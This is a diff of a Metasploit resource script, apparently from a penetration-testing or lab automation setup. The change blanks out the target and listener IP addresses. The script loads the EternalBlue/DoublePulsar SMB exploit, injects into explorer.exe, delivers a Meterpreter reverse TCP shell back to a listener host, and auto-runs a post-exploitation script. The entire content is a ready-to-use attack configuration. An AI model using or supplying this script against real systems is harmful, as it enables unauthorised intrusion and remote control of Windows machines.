@@ -1,10 +1,10 @@
 spool ../data/exploit.txt
 use exploit/windows/smb/eternalblue_doublepulsar
-set rhost 10.4.175.189 
+set rhost  
 set targetarchitecture x64
 set processinject explorer.exe
 set payload windows/x64/meterpreter/reverse_tcp
-set lhost 10.4.160.160
+set lhost 
 set AutoRunScript multi_console_command -r autometerpreter.rc
 exploit -j
 sleep 100s
